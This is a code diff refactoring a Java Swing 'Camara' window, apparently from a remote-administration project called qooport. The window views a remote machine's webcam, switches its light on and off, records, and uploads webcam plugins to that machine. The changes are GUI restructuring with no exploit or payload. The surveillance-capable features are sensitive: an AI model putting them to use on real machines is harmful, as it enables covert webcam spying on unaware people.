@@ -7,31 +7,26 @@ import java.awt.FlowLayout;
 import java.awt.Font;
 import java.awt.GraphicsDevice;
 import java.awt.GraphicsEnvironment;
-import java.awt.GridLayout;
 import java.awt.Insets;
 import java.awt.event.ActionEvent;
 import java.awt.event.ActionListener;
 import java.awt.event.ComponentEvent;
 import java.awt.event.ComponentListener;
+import java.awt.event.KeyEvent;
 import java.awt.event.WindowEvent;
 import java.awt.event.WindowListener;
 import java.awt.geom.GeneralPath;
-import java.awt.image.BufferedImage;
 import java.io.IOException;
 import javax.swing.BorderFactory;
-import javax.swing.Icon;
-import javax.swing.ImageIcon;
 import javax.swing.JButton;
 import javax.swing.JCheckBoxMenuItem;
 import javax.swing.JComboBox;
-import javax.swing.JFrame;
-import javax.swing.JLabel;
 import javax.swing.JMenu;
 import javax.swing.JMenuBar;
 import javax.swing.JMenuItem;
 import javax.swing.JPanel;
-import javax.swing.JScrollPane;
 import javax.swing.JSlider;
+import javax.swing.JTextField;
 import javax.swing.JToolBar;
 import javax.swing.JWindow;
 import javax.swing.border.Border;
@@ -40,18 +35,18 @@ import javax.swing.event.ChangeListener;
 import network.Conexion;
 import qooport.asociado.Asociado;
 import qooport.gui.personalizado.BarraEstado;
-import qooport.modulos.reproductor.Contenedor;
+import qooport.modulos.VentanaReproductor;
 import static qooport.modulos.escritorioremoto.EscritorioRemoto.tipoLetra;
+import qooport.modulos.reproductor.Contenedor;
 import qooport.modulos.reproductor.Reproductor;
 import qooport.utilidades.GuiUtil;
-import qooport.utilidades.QoopoIMG;
 import qooport.utilidades.Util;
 import qooport.utilidades.contador.ContadorBPS;
 
-public class Camara extends JFrame
-        implements WindowListener {
+public class Camara extends VentanaReproductor implements WindowListener {
 
     private static int FORMATO = 4;
+    static GraphicsDevice device = GraphicsEnvironment.getLocalGraphicsEnvironment().getDefaultScreenDevice();
     private Reproductor reproductor;
     public boolean conetado;
     public BarraEstado barraInferior = new BarraEstado();
@@ -68,14 +63,10 @@ public class Camara extends JFrame
     private JButton btnIniciarDetener;
     private JButton btnVerPantallaCompleta;
     private JCheckBoxMenuItem itmGrabar;
-    private JLabel lblCam;
-    private JScrollPane jscrollCam;
-    private JPanel contenedorPrincipal;
     private Asociado servidor;
     private JMenuItem lblCalidad;
     private JSlider jScalidad;
     private boolean pidiendo;
-    private boolean yaLlego; //controla que halla llegado la solicitud enviada
     private JMenuItem itmSubirPlugin;
     private JComboBox webcam;
     private JComboBox webcamSizes;
@@ -97,18 +88,17 @@ public class Camara extends JFrame
     private boolean noOculto;
     private String camaraNombre = "";
     private String strResolucion;
-    static GraphicsDevice device = GraphicsEnvironment.getLocalGraphicsEnvironment().getDefaultScreenDevice();
+    private boolean corriendoOcultar = false;
 
     public Camara(Conexion conexion, Asociado servidor) {
         this.conexion = conexion;
         iniciarHilos();
         this.servidor = servidor;
         reproductor = new Reproductor();
+        reproductor.setDirectorioEscritorio(getServidor().getdWebCam());
         initComponents();
-
         pidiendo = false;
-        yaLlego = true;
-
+//        yaLlego = true;
     }
 
     private void iniciarHilos() {
@@ -125,12 +115,9 @@ public class Camara extends JFrame
     private void initComponents() {
         fuenteMenus = new Font(tipoLetra, 1, 11);
         barra = new JMenuBar();
-
         this.btnIniciarDetener = new JButton();
         this.itmGrabar = new JCheckBoxMenuItem();
         this.itmSubirPlugin = new JMenuItem();
-        this.jscrollCam = new JScrollPane();
-        this.lblCam = new JLabel();
         this.lblCalidad = new JMenuItem();
         this.webcam = new JComboBox();
         webcamSizes = new JComboBox();
@@ -149,7 +136,6 @@ public class Camara extends JFrame
         this.menuAccion.setIcon(Util.cargarIcono20("/resources/rayo_azul.png"));
         this.menuAccion.setText("Acciones");
         menuAccion.setFont(fuenteMenus);
-
         itmListarCamaras.setIcon(Util.cargarIcono16("/resources/refresh.png"));
         itmListarCamaras.setSelected(true);
         itmListarCamaras.setText("Listar cámaras");
@@ -161,7 +147,6 @@ public class Camara extends JFrame
         });
 
         this.menuAccion.add(this.itmListarCamaras);
-
         itmActivarLed.setIcon(Util.cargarIcono16("/resources/switch_on.png"));
         itmActivarLed.setSelected(true);
         itmActivarLed.setText("Activar Luz");
@@ -173,7 +158,6 @@ public class Camara extends JFrame
             }
         });
         this.menuAccion.add(this.itmActivarLed);
-
         itmDesactivarLed.setIcon(Util.cargarIcono16("/resources/switch_off.png"));
         itmDesactivarLed.setSelected(true);
         itmDesactivarLed.setText("Desactivar Luz");
@@ -185,7 +169,6 @@ public class Camara extends JFrame
             }
         });
         this.menuAccion.add(this.itmDesactivarLed);
-
         ListarResoluciones.setIcon(Util.cargarIcono16("/resources/refresh.png"));
         ListarResoluciones.setSelected(true);
         ListarResoluciones.setText("Listar resoluciones");
@@ -196,7 +179,6 @@ public class Camara extends JFrame
             }
         });
         this.menuAccion.add(this.ListarResoluciones);
-
         itmSubirPlugin.setIcon(Util.cargarIcono16("/resources/plugin_add.png"));
         itmSubirPlugin.setVisible(true);
         itmSubirPlugin.setText("Subir plugins");
@@ -288,19 +270,6 @@ public class Camara extends JFrame
         menuVer.add(menuCalidad);
 
         reproductor.setContenedor(new Contenedor(this));
-
-        this.jscrollCam.setBackground(new Color(255, 102, 51));
-        this.jscrollCam.setForeground(new Color(255, 204, 51));
-        this.jscrollCam.setDoubleBuffered(true);
-        this.lblCam.setBackground(new Color(0, 0, 0));
-        lblCam.setOpaque(true);
-        this.lblCam.setHorizontalAlignment(2);
-        this.lblCam.setVerticalAlignment(1);
-        this.lblCam.setDoubleBuffered(true);
-        this.jscrollCam.setViewportView(this.lblCam);
-        contenedorPrincipal = new JPanel();
-        contenedorPrincipal.setLayout(new GridLayout(1, 1));
-        contenedorPrincipal.add(lblCam);
         barra.add(menuAccion);
         barra.add(menuVer);
         barra.add(menuHerramientas);
@@ -315,7 +284,8 @@ public class Camara extends JFrame
         this.setLayout(new BorderLayout());
 //        this.add(barra, BorderLayout.NORTH);
         this.add(panelActivador, BorderLayout.NORTH);
-        this.add(contenedorPrincipal, BorderLayout.CENTER);
+//        this.add(contenedorPrincipal, BorderLayout.CENTER);
+        this.add(reproductor.getContenedor(), BorderLayout.CENTER);
         this.add(barraInferior, BorderLayout.SOUTH);
         actualizarFormaControles();
         this.setResizable(true);
@@ -326,7 +296,7 @@ public class Camara extends JFrame
         this.addComponentListener(new ComponentListener() {
             @Override
             public void componentResized(java.awt.event.ComponentEvent evt) {
-                Camara.this.pintar();
+//                Camara.this.pintar();
                 actualizarFormaControles();
             }
 
@@ -378,20 +348,6 @@ public class Camara extends JFrame
         frameControles.pack();
         this.actualizarFormaControles();
 
-    }
-
-    public void pintar() {
-        pintar(servicio.getImagen());
-    }
-
-    public void pintar(BufferedImage imagen) {
-        Icon icono = null;
-        try {
-            //icono = new ImageIcon(QoopoIMG.escalar(imagen, 2, 0, false, this.getLblCam().getWidth(), this.getLblCam().getHeight()));
-            icono = new ImageIcon(QoopoIMG.ajustarEscritorio(imagen, true,  this.getLblCam().getWidth(), this.getLblCam().getHeight()).getImagen());
-        } catch (Exception e) {
-        }
-        this.getLblCam().setIcon(icono);
     }
 
     private void caliStateChanged(ChangeEvent evt) {
@@ -454,27 +410,18 @@ public class Camara extends JFrame
         servidor.enviarPluginsWebCam();
     }
 
-    public JLabel getLblCam() {
-        return lblCam;
-    }
-
-    public void setLblCam(JLabel lblCam) {
-        this.lblCam = lblCam;
-    }
-
-    public boolean isYaLlego() {
-        return yaLlego;
-    }
-
-    public void setYaLlego(boolean yaLlego) {
-        this.yaLlego = yaLlego;
-    }
-
-    public void registrarLlegada() {
-        this.yaLlego = true;
-        contadorFps.agregar(1);
-    }
-
+//    public boolean isYaLlego() {
+//        return yaLlego;
+//    }
+//
+//    public void setYaLlego(boolean yaLlego) {
+//        this.yaLlego = yaLlego;
+//    }
+//
+//    public void registrarLlegada() {
+//        this.yaLlego = true;
+////        contadorFps.agregar(1);
+//    }
     public Conexion getConexion() {
         return conexion;
     }
@@ -696,7 +643,6 @@ public class Camara extends JFrame
             e.printStackTrace();
         }
     }
-    private boolean corriendoOcultar = false;
 
     private void ocultarControles() {
         if (corriendoOcultar) {
@@ -854,6 +800,82 @@ public class Camara extends JFrame
         } catch (Exception e) {
 
         }
+    }
+
+    public Reproductor getReproductor() {
+        return reproductor;
+    }
+
+    public void setReproductor(Reproductor reproductor) {
+        this.reproductor = reproductor;
+    }
+
+    //-------------------------------
+    @Override
+    public void mouseMove(float f, float f1, int i, int i1) {
+
+    }
+
+    @Override
+    public void mouseDragged(float px, float py, int boton, int pantallaID) {
+
+    }
+
+    @Override
+    public void mousePresionado(float f, float f1, int i, int i1) {
+
+    }
+
+    @Override
+    public void mouseLiberado(float f, float f1, int i, int i1) {
+
+    }
+
+    @Override
+    public void mouseRueda(float f, float f1, int i, int i1, int i2) {
+
+    }
+
+    @Override
+    public void keyTyped(KeyEvent ke) {
+
+    }
+
+    @Override
+    public void keyPressed(KeyEvent ke) {
+
+    }
+
+    @Override
+    public void keyReleased(KeyEvent ke) {
+
+    }
+
+    public int getESCALA() {
+        return VentanaReproductor.ESCALA_PERFECTO;
+    }
+
+    public JComboBox getCmbMonitor() {
+        return null;
+    }
+
+    public JTextField getTxtColumnas() {
+        return null;
+    }
+
+    @Override
+    public Boolean isEscalarRemoto() {
+        return false;
+    }
+
+    @Override
+    public Boolean isAjustarVentana() {
+        return false;
+    }
+
+    @Override
+    public Boolean isEscalarSuave() {
+        return true;
     }
 
 }
